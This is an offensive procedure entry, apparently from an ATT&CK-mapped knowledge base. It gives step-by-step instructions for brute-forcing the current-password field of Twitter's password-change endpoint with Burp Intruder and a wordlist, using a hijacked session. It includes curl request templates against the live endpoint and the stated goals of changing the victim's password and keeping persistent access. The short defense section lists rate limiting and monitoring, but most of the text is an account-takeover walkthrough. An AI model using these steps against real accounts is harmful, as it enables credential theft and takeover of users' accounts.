---
id: proc-970157-brute-force
tags:
  - brute-force
  - rate-limit-bypass
  - twitter
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/twitter-password-change-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Password Guessing]]'
updated_at: '2025-12-14T17:31:43.170Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Password Guessing]]'
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Password Guessing]]'
---
# Brute-Force-Current-Password-with-Burp-Intruder

## Summary

This procedure uses Burp Suite's Intruder to automate brute-force attacks on the current_password parameter in Twitter's password change endpoint, exploiting the lack of rate limiting to guess the victim's password and takeover the account in minutes.

## Description

Assuming a hijacked session and intercepted request, this targets the /i/account/change_password.json POST where current_password is verified without throttling. Attackers load a password list, replace the parameter, and send rapid requests. Over 1000 attempts succeed in ~3.4 minutes, with success indicated by a 200 response allowing password update. Prerequisites: Intercepted request and wordlist. Outcomes: Account password changed, full control gained.

## Requirements

1. Burp Suite Professional with Intruder module
2. Password wordlist (e.g., rockyou.txt or targeted guesses)
3. Stable hijacked session with valid auth headers

## Defense

Defensive measures and detection strategies:

- Add aggressive rate limiting (e.g., 5 attempts per minute per session) on password endpoints
- Require additional factors (e.g., email/SMS code) for password changes
- Monitor for high-volume requests from single sessions and auto-logout suspicious activity

## Objectives

1. Guess the correct current password via exhaustive testing
2. Update the account password to attacker-controlled value
3. Achieve persistent access post-takeover

## Instructions

### Step 1: Send Request to Intruder and Position Payload

**Context**: Load the intercepted request and mark current_password for replacement to enable automated guessing.

**Command** ([[commands/twitter-password-change-post]]):
In Burp, send to Intruder; add § to current_password value.

```bash
# Base request in Intruder (payload replaces §)
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: auth_token=██████████" \
  -d "current_password=§&password=newpass&password_confirmation=newpass"
```

> Expected output: Positions tab shows one payload set; clear other positions if any.

### Step 2: Load Payloads and Configure Attack

**Context**: Import password list and set options for snorting (e.g., no delays) to maximize speed.

**Command** ([[commands/twitter-password-change-post]]):
Payloads tab: Load file, set type to simple list.

```bash
# No direct command; Intruder handles iteration over payloads like:
# current_password=pass1, pass2, ..., pass1000
```

> Expected output: Payload count displayed; attack type 'Sniper' for single position.

### Step 3: Launch and Monitor Attack

**Context**: Execute the brute-force and identify success based on response length/code.

**Command** ([[commands/twitter-password-change-post]]):
Start attack; grep responses for success JSON.

```bash
# Post-attack verification (manual curl with found password)
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "current_password=foundpass&password=attackerpass&password_confirmation=attackerpass"
```

> Expected output: 200 OK with {"success":true} or similar; account now controlled.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Brute Force]] Brute Force
- [[Password Guessing]] Password Guessing

### Sub-Techniques

- [[Password Guessing]] Password Guessing

## Commands Used

- [[commands/twitter-password-change-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- brute-force
- rate-limit-bypass
